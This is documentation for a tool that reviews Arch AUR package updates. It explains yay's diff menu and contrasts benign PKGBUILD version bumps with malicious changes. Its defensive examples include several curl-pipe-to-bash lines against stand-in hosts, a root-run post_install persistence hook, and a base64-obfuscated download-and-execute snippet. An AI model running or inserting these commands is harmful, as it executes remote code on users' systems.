# Reviewing AUR updates

`arc update system` summarizes pending AUR updates and points out changes worth extra attention. Yay still handles review prompts, dependency resolution, and builds. You decide whether to continue. Arc keeps routine source, compiler, test, and packaging output out of the terminal while showing important warnings and concise progress. Use `--log` to save the complete raw output to a private file.

Arc trusts a reviewed snapshot only after the installed state matches the reviewed plan. A canceled or unsuccessful update remains flagged next time. See [platforms](platforms.md) for the checks and state locations.

## Driving yay's diffmenu

When `arc update system` invokes yay, it passes `--answerdiff All`, so yay chooses `All` for the diff menu instead of leaving the blank-response default at `[N]one` and skipping the review. The PKGBUILD edit menu remains interactive.

When driving yay directly, at `Diffs to show?`:

- `a` + Enter: show diffs for all packages
- `1`, `1 3`, `1-3`: show diffs for specific packages by number
- `^2`: show all except package 2
- Enter alone: choose `[N]one`, which **skips the review entirely**. The capitalized option is the default, so pressing Enter without reading the prompt defeats the review.

Diffs open in your `$PAGER` (usually `less`). Press `q` to close the current diff and advance to the next one, and `/` to search. Press `Ctrl-C` at any yay prompt to abort without installing anything. Packages being built for the first time have no previous version to diff against, so yay shows the full PKGBUILD. Read it top to bottom once; future updates only need the diff.

### If you hate the pager

The raw `less` view is the default, not the only option:

- **Better pager, zero yay changes.** yay pipes diffs through `$YAYPAGER` and falls back to `$PAGER`. For example, `export YAYPAGER='delta --side-by-side'` gives syntax-highlighted, side-by-side diffs. `bat -l diff` works too.
- **Read it in your editor instead.** When driving yay directly, answer `N` to `Diffs to show?` and pick packages at the `PKGBUILDs to edit?` prompt. Yay opens the files in `$EDITOR`. With `EDITOR='code --wait'` or `nvim`, close the editor window to continue. This shows the current files, not a diff.
- **Inspect the clone yourself.** Yay keeps its checkouts in `~/.cache/yay/<pkgbase>/`, which is a plain Git repository. From another terminal, run `git -C ~/.cache/yay/cursor-bin log -p`, or open the repository in a Git GUI or diff tool.
- **Browse it on the web.** Every package's history is public cgit: `https://aur.archlinux.org/cgit/aur.git/log/?h=<pkgbase>` shows each commit as a clickable diff in your browser.

## What a normal update looks like

The overwhelming majority of diffs are version bumps. The tell is that everything moves *together* and nothing changes *shape*:

```diff
 pkgname=cursor-bin
-pkgver=3.7.36
+pkgver=3.15.19
 pkgrel=1
-_electron=electron39
+_electron=electron40
-_commit=776d1f9d76df50a4e0aeca61819a88e7c1b861e2
+_commit=de07bee81cefe43461ebf4f40c3d2d78d15052aa
 source=("https://downloads.cursor.com/production/${_commit}/linux/x64/deb/amd64/deb/cursor_${pkgver}_amd64.deb"
-sha512sums[0]=d06af53505b0cbfadf9ecfcf32590a60b21ff496171ecbcdaf2790bd0573...
+sha512sums[0]=77d98fdafef453c9b2e872929d1764b735dcdda71564bbd42a8ca2e2e97...
```

Benign changes you'll see constantly:

- `pkgver` or `pkgrel` bump with a matching checksum change: new source, new hash, always paired
- Pinned upstream identifiers moving with the version: commit hashes, build IDs, dependency version bumps (`electron39` → `electron40`)
- The `source=` URL *template* unchanged: only variables inside it (`${pkgver}`, `${_commit}`) resolve differently, while the **host** stays the same
- Packaging housekeeping: new `depends`/`optdepends`, `makedepends` additions that match the upstream changelog, `.desktop`/icon fixes, `provides`/`conflicts` tweaks, comment and maintainer-header edits
- A `sha512sums=('SKIP' ...)` entry that is overridden a few lines later with a real hash (a common pattern for per-arch sources; arc's SKIP finding is Info-severity for exactly this reason)

## What a malicious diff looks like

Real AUR attacks are often surprisingly simple. The payload is usually visible in the diff if someone reads it. The patterns below are roughly ordered from most obvious to least obvious:

**Source host changed.** The single strongest tell. The version bump is cover; the download now comes from somewhere else:

```diff
-source=("https://downloads.cursor.com/production/${_commit}/.../cursor_${pkgver}_amd64.deb"
+source=("https://cursor-releases.site/production/${_commit}/.../cursor_${pkgver}_amd64.deb"
```

Look-alike domains (`github.com.cdn-dl.net`), a maintainer's "mirror", or a raw pastebin/gist URL replacing the vendor's domain all count. arc flags this HIGH as URL host drift. A *added* mirror alongside the original is more often benign but still deserves a look.

**Checksum weakened instead of updated.** A hash replaced with `SKIP` (with no override), or `sha512sums` downgraded to `md5sums`, means the fetched source is no longer verified. Combined with a URL change, this can deliver an unverified payload:

```diff
-sha512sums=('77d98fdafef453c9b2e872929d1764b...')
+sha512sums=('SKIP')
```

**A second download stage appears.** The PKGBUILD's checksums only cover `source=`. Anything fetched *during* the build is invisible to them:

```diff
 build() {
   cd "$pkgname-$pkgver"
+  curl -s https://api.telemetry-check.dev/init.sh | bash
   make
 }
```

The same applies to a new `npm install`, `pip install`, or `cargo install` for a package that is not in the project's lockfile, or to a `git clone` of an unrelated repository. Many Electron and Node packages legitimately run `npm ci` against a shipped lockfile, so arc flags new fetch lines and downgrades of lockfile-pinned ones instead of flagging every occurrence.

**Install-time hooks appear or grow.** `build()` runs in a build sandbox as your user, but `.install` functions and libalpm hooks run as **root on your machine** at install time. A new `install=` declaration, or a `post_install()` that gains network or persistence behavior, is a major escalation:

```diff
 post_install() {
   xdg-icon-resource forceupdate
+  curl -s https://x.example/s | bash
+  systemctl enable --now helper.timer
 }
```

**The payload hides outside the PKGBUILD.** AUR repositories ship local files such as patches, `foo.sh` helpers, and `.desktop` files that the PKGBUILD applies or installs. A diff that adds quiet lines to `fix-build.patch` while the PKGBUILD barely changes deserves as much attention as the PKGBUILD itself. Arc scans the whole snapshot for this reason. New binary files are effectively unreviewable, so treat them as hostile until explained.

**Obfuscation.** There is no honest reason for a PKGBUILD to contain `base64 -d`, `eval` on a constructed string, hex-escaped blobs, or variables assembled character-by-character. Packaging is boring; anything that makes the diff *harder to read* is itself the finding:

```diff
+_x=$(echo aHR0cHM6Ly9ldmlsLmV4YW1wbGUvcGF5bG9hZA== | base64 -d)
+curl -s "$_x" -o /tmp/.cache && chmod +x /tmp/.cache && /tmp/.cache
```

**Privilege and persistence touches.** `chmod +s` (setuid), writes to `/etc/systemd/`, `~/.bashrc`, `~/.config/autostart/`, cron entries, or `sudo` anywhere in build/install functions.

**Context multipliers.** None of the above proves malice by itself, and the absence of these signals proves nothing. Arc's provenance findings help set the level of suspicion: a maintainer change or orphan adoption before the diff, one account taking over several packages, or a `pkgrel`-only bump with unexplained file changes. A new maintainer's first push deserves extra scrutiny; a routine bump from a long-time maintainer usually needs less.

## A 20-second checklist per diff

1. Did the source **host** change? (No → mostly fine already.)
2. Did checksums update *with* the version, or get weakened/SKIPped?
3. Any new network access in `prepare()`/`build()`/`package()`?
4. Any new or changed `.install`, hook, patch, or local script? Read those hunks too.
5. Does anything require effort to read? Obfuscation is a red flag by itself.
6. Cross-check arc's pre-yay findings: maintainer/adoption flags raise the bar for everything above.

When in doubt, press `Ctrl-C`. Nothing installs, and the package stays flagged. Arc commits its trusted baseline only after a yay run succeeds, so a rejected diff appears again in full on the next update.
